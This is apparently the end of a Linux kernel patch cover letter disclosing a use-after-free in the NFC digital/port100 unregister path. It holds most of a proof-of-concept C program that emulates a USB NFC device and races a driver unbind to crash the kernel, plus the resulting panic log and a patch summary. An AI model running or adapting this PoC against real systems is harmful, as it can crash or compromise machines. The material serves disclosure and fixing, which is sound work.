		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, ret);
		     h = NLMSG_NEXT(h, ret)) {
			if (h->nlmsg_seq != seq)
				continue;
			if (h->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(h);
				if (h->nlmsg_len < NLMSG_LENGTH(sizeof(*err)))
					return -1;
				if (err->error) {
					errno = -err->error;
					return -1;
				}
				return 0;
			}
		}
	}
}

static int genl_get_family_id(int fd, uint32_t *seq_io, const char *name)
{
	uint8_t buf[8192];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *ghdr;
	struct sockaddr_nl nladdr;
	struct iovec iov;
	struct msghdr msg;
	uint32_t seq = (*seq_io)++;

	memset(buf, 0, sizeof(buf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ghdr));
	nlh->nlmsg_type = GENL_ID_CTRL;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = seq;
	nlh->nlmsg_pid = (uint32_t)getpid();

	ghdr = (struct genlmsghdr *)NLMSG_DATA(nlh);
	ghdr->cmd = CTRL_CMD_GETFAMILY;
	ghdr->version = 1;
	ghdr->reserved = 0;

	if (nla_put(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME, name,
		    (uint16_t)strlen(name) + 1) < 0)
		return -1;

	memset(&nladdr, 0, sizeof(nladdr));
	nladdr.nl_family = AF_NETLINK;
	memset(&msg, 0, sizeof(msg));
	iov.iov_base = nlh;
	iov.iov_len = nlh->nlmsg_len;
	msg.msg_name = &nladdr;
	msg.msg_namelen = sizeof(nladdr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	if (sendmsg(fd, &msg, 0) < 0)
		return -1;

	for (;;) {
		ssize_t ret = recv(fd, buf, sizeof(buf), 0);
		struct nlmsghdr *h;
		if (ret < 0)
			return -1;

		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, ret);
		     h = NLMSG_NEXT(h, ret)) {
			if (h->nlmsg_seq != seq)
				continue;

			if (h->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(h);
				if (err->error) {
					errno = -err->error;
					return -1;
				}
				return -1;
			}

			if (h->nlmsg_type == GENL_ID_CTRL) {
				struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(h);
				int rem = h->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
				struct nlattr *attr = (struct nlattr *)((uint8_t *)gh +
							       sizeof(*gh));
				for (; rem >= (int)sizeof(*attr);
				     attr = (struct nlattr *)((uint8_t *)attr +
							NLA_ALIGN(attr->nla_len))) {
					if (attr->nla_len < sizeof(*attr) || attr->nla_len > rem)
						break;
					if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
						uint16_t id;
						memcpy(&id,
						       (uint8_t *)attr + sizeof(*attr),
						       sizeof(id));
						/* consume pending ACK */
						nl_send_recv_ack(fd, nlh);
						return id;
					}
					rem -= NLA_ALIGN(attr->nla_len);
				}
			}
		}
	}
}

static int nfc_genl_simple_cmd(int fd, uint32_t *seq_io, uint16_t fam_id,
			       uint8_t cmd, uint32_t dev_idx,
			       bool include_im_proto, uint32_t im_proto)
{
	uint8_t buf[1024];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *gh;
	uint32_t seq = (*seq_io)++;

	memset(buf, 0, sizeof(buf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
	nlh->nlmsg_type = fam_id;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = seq;
	nlh->nlmsg_pid = (uint32_t)getpid();

	gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
	gh->cmd = cmd;
	gh->version = NFC_GENL_VERSION;
	gh->reserved = 0;

	if (nla_put(nlh, sizeof(buf), NFC_ATTR_DEVICE_INDEX, &dev_idx,
		    sizeof(dev_idx)) < 0)
		return -1;

	if (include_im_proto) {
		if (nla_put(nlh, sizeof(buf), NFC_ATTR_IM_PROTOCOLS, &im_proto,
			    sizeof(im_proto)) < 0)
			return -1;
	}

	return nl_send_recv_ack(fd, nlh);
}

static int retry_nfc_genl_simple_cmd(int fd, uint32_t *seq_io, uint16_t fam_id,
				     uint8_t cmd, uint32_t dev_idx,
				     bool include_im_proto, uint32_t im_proto,
				     int attempts, int delay_ms)
{
	int i;
	int rc;
	int saved_errno = 0;

	for (i = 0; i < attempts; i++) {
		rc = nfc_genl_simple_cmd(fd, seq_io, fam_id, cmd, dev_idx,
					 include_im_proto, im_proto);
		if (!rc)
			return 0;

		saved_errno = errno;

		if (i + 1 < attempts)
			usleep((useconds_t)delay_ms * 1000);
	}

	errno = saved_errno ? saved_errno : EIO;
	return -1;
}

int main(void)
{
	struct port100_ctx ctx;
	pthread_t bulk_thr;
	pthread_t hog_thr[8];
	struct hog_ctx hogs[8];
	int hog_count = 0;
	int baseline[32];
	int baseline_n;
	int baseline_max = -1;
	int port100_idx;
	uint32_t nlseq = 1;
	int nlfd = -1;
	int fam_id;
	int i;

	memset(&ctx, 0, sizeof(ctx));
	ctx.fd = -1;
	ctx.ep_in = -1;
	ctx.ep_out = -1;
	ctx.running = true;
	pthread_mutex_init(&ctx.lock, NULL);
	pthread_cond_init(&ctx.cond, NULL);

	baseline_n = scan_nfc_indices(baseline, ARRAY_SIZE(baseline));
	for (i = 0; i < baseline_n; i++) {
		if (baseline[i] > baseline_max)
			baseline_max = baseline[i];
	}
	fprintf(stderr, "baseline nfc max idx=%d\n", baseline_max);

	if (setup_raw_gadget(&ctx) < 0) {
		perror("setup_raw_gadget");
		return 1;
	}

	if (wait_until_configured(&ctx, 15) < 0) {
		perror("wait_until_configured");
		return 1;
	}

	if (pthread_create(&bulk_thr, NULL, bulk_thread_fn, &ctx) != 0) {
		perror("pthread_create");
		return 1;
	}

	port100_idx = wait_new_nfc_index(baseline_max, 15);
	if (port100_idx < 0) {
		fprintf(stderr, "failed to find new nfc device index\n");
		goto out;
	}
	fprintf(stderr, "port100 nfc index = %d\n", port100_idx);

	nlfd = nl_sock_open(&nlseq);
	if (nlfd < 0) {
		perror("nl_sock_open");
		goto out;
	}

	fam_id = genl_get_family_id(nlfd, &nlseq, NFC_GENL_NAME);
	if (fam_id < 0) {
		perror("genl_get_family_id");
		goto out;
	}
	fprintf(stderr, "nfc genl family id = %d\n", fam_id);

	if (retry_nfc_genl_simple_cmd(nlfd, &nlseq, fam_id, NFC_CMD_DEV_UP,
				      port100_idx, false, 0, 60, 100) < 0)
		perror("NFC_CMD_DEV_UP");
	else
		fprintf(stderr, "NFC_CMD_DEV_UP ok\n");

	if (retry_nfc_genl_simple_cmd(nlfd, &nlseq, fam_id,
				      NFC_CMD_START_POLL, port100_idx,
				      true, NFC_PROTO_JEWEL_MASK, 60, 100) < 0)
		perror("NFC_CMD_START_POLL");
	else
		fprintf(stderr, "NFC_CMD_START_POLL ok\n");

	pthread_mutex_lock(&ctx.lock);
	if (!ctx.saw_in_comm_rf) {
		struct timespec ts;
		clock_gettime(CLOCK_REALTIME, &ts);
		ts.tv_sec += 10;
		pthread_cond_timedwait(&ctx.cond, &ctx.lock, &ts);
	}
	pthread_mutex_unlock(&ctx.lock);

	if (!ctx.saw_in_comm_rf) {
		fprintf(stderr, "did not observe IN_COMM_RF command\n");
		goto out;
	}

	fprintf(stderr, "trigger point reached, unbinding port100\n");

	for (i = 0; i < 2 && i < (int)ARRAY_SIZE(hogs); i++) {
		hogs[i].run = true;
		hogs[i].cpu = i;
		if (pthread_create(&hog_thr[i], NULL, hog_thread_fn, &hogs[i]) == 0)
			hog_count++;
	}

	set_thread_realtime(95);

	if (unbind_port100() < 0)
		perror("unbind_port100");
	else
		fprintf(stderr, "unbind requested\n");

	/* give kernel some time to run disconnect path */
	sleep(2);

out:
	for (i = 0; i < hog_count; i++)
		hogs[i].run = false;
	for (i = 0; i < hog_count; i++)
		pthread_join(hog_thr[i], NULL);

	ctx.running = false;
	if (ctx.fd >= 0)
		close(ctx.fd);
	if (nlfd >= 0)
		close(nlfd);
	pthread_cancel(bulk_thr);
	pthread_join(bulk_thr, NULL);
	fprintf(stderr, "done\n");
	return 0;
}

------END poc.c--------

----BEGIN crash log----
[  146.906029][    T8] usb 3-1: new high-speed USB device number 2 using dummy_hcd
[  147.096700][    T8] usb 3-1: New USB device found, idVendor=054c, idProduct=06c1, bcdDevice= 0.01
[  147.128607][    T8] port100 3-1:1.0: NFC: Sony NFC Port-100 Series attached (firmware v1.01)
[  147.257864][    C1] port100 3-1:1.0: NFC: Urb failure (status -108)
[  147.264911][ T9678] port100 3-1:1.0: NFC: A command is still in process
[  147.266168][ T9678] port100 3-1:1.0: NFC: Sony Port-100 NFC device disconnected
[  147.267189][ T9678] ------------[ cut here ]------------
[  147.267880][ T9678] ODEBUG: free active (active state 0) object: ffff88801fdc50e8 object type: work_struct hint: port100_wq_cmd_complete+0x0/0x330
[  147.270533][ T9678] WARNING: CPU: 1 PID: 9678 at lib/debugobjects.c:515 debug_print_object+0x19e/0x2a0
[  147.272216][ T9678] CPU: 1 PID: 9678 Comm: poc Not tainted 6.6.113-gae5e8e39e063 #2
[  147.295908][ T9678]  device_unbind_cleanup+0x19/0x1b0
[  147.296551][ T9678]  device_release_driver_internal+0x4bf/0x610
[  147.297317][ T9678]  unbind_store+0xf2/0x110
[  147.317382][ T9678] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  147.372780][ T9678] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Yuqi Xu

Yuqi Xu (1):
  nfc: digital: fix use-after-free in unregister

 drivers/nfc/nfcsim.c      |  8 +++++++-
 drivers/nfc/port100.c     |  7 +++++++
 drivers/nfc/st95hf/core.c | 13 ++++++++++---
 drivers/nfc/trf7970a.c    |  5 +++++
 net/nfc/digital_core.c    | 22 +++++++++++++++++++++-
 5 files changed, 50 insertions(+), 5 deletions(-)

-- 
2.55.0

